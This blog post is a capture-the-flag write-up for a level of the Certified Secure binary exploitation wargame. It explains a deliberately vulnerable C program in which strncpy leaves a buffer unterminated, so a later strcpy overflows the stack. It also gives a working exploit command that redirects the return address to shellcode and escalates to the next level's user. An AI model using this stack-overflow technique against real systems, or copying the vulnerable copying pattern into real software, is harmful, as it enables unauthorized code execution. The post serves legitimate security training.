![Logo](/assets/images/belts-orange.png)

In this post we'll continue with level3 of the **Certified Secure Binary Mastery**, [Ensign](https://www.certifiedsecure.com/certification/view/37). 
This time we will be dealing with a slightly more interesting vulnerability, an application logic vulnerability, again involving strings operations.
To review the previous levels, check the link below:
* [Binary Master: Ensign - Level 1](https://livz.github.io/2016/01/07/binary-master-ensign-1.html)
* [Binary Master: Ensign - Level 2](https://livz.github.io/2016/01/14/binary-master-ensign-2.html)

## 0 - Discovery

Let's connect to the server and check the binary we're dealing with:
```
$ ssh level3@hacking.certifiedsecure.com -p 8266
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 3.13.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '16.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.



   ___  _                      __  ___         __              
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                 _            /___/  
                             ___ ___  ___ (_)__ ____ 
                            / -_) _ \(_-</ / _ `/ _ \
                            \__/_//_/___/_/\_, /_//_/
                                          /___/      

```

Let's see if we have any mitigation techniques using [checksec.sh](http://www.trapkit.de/tools/checksec.html), downloaded and run locally :
```bash
$ checksec.sh --file level3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level3
```

NX is disabled and again there is no stack canary. Good news. Let's verify that the stack is executable:

```
$ readelf -lW level3 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
```

The R**W**E flag suggests Read-**Write**-Execute flags are all enabled. Also remember from the previous levels that ASLR is disabled on the system and all the addresses are static.

## 1 - Vulnerability

In this case we have a logic vulnerability. Notice that now string copying is done in a more secure way, using the [strncpy](http://www.cplusplus.com/reference/cstring/strncpy/) function, which receives as its 3rd parameter a maximum number of character to be copied from source to destination buffer. There is a very important caveat here, however:
> No null-character is implicitly appended at the end of _destination_ if _source_ is longer than _num_. Thus, in this case, destination shall not be considered a null terminated C string (reading it as such would overflow).

```c
#include <string.h>
#include <stdio.h>

void foo(char* a, char* b) {
        char buf1[16];
        char buf2[16];
        char buf3[16];
        int i;

        for (i=0; i<16;i++) {
                buf2[i] = "A";
        }

        if (strlen(a) <= sizeof(buf3)) {
[1]             strncpy(buf3, a, sizeof(buf3));


[2]             if (strlen(b) <= strlen(buf3)) {
[3]                     strcpy(buf1, b);
                }
        }
}

int main(int argc, char** argv) {
        if (argc != 3) {
                printf("Usage: %s <a> <b>\n", argv[0]);

                return -1;
        }

        foo(argv[1], argv[2]);
        return 0;
}
```


* So the call to **strncpy(buf3, a, sizeof(buf3)) [1]** will **not** add a null terminator to **buf3** if parameter **a** (first user input!) is exactly 16 characters.
* Following this, the call to **strlen(buf3) [2]** will go over the bounds of the string **buf3** (no null terminator for **buf3**) and will return a larger value than expected. 
* This will lead to the execution of the **strcpy(buf1, b) [3]** call, which will overflow **buf1** with **b** (second user input), thus giving us the posibility to control again the return address from function **foo**.


## 2 - Exploit

For all the steps describe before to work, the layot of the stack of function **foo** is very important. Let's check that in IDA. After a bit of renaming, the variables on stack look like this: 

![Logo](/assets/images/bm3-1.png)

Steps:
* We need a payload of 16 characters in **a**
* We need to put 32 bytes in **buf1** from **b** in order to overwrite the return address. 
* We'll use the same trick with the shellcode placed in an environment variable

```bash
$ ./level3 $(python -c 'print "B"*16') $(python -c 'print "C"*32 + "\xd3\xd8\xff\xff"')
$ id
uid=1004(level3) gid=1004(level3) euid=1005(level4) groups=1005(level4),1004(level3)
```

## 3 - Profit

```
$ /home/level4/victory
   ___  _                      __  ___         __
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                 _            /___/  
                             ___ ___  ___ (_)__ ____    
                            / -_) _ \(_-</ / _ `/ _ \   
                            \__/_//_/___/_/\_, /_//_/   
                                          /___/         
                                          
Subject: Victory!                         

Congrats, you have solved level3. To update your score,
send an e-mail to unlock@certifiedsecure.com and include:
   * your CS-ID
   * which level you solved (level3 @ binary mastery ensign)
   * the exploit 
   
You can now start with level4. If you want, you can log in
as level4 with password  [REDACTED] 
```
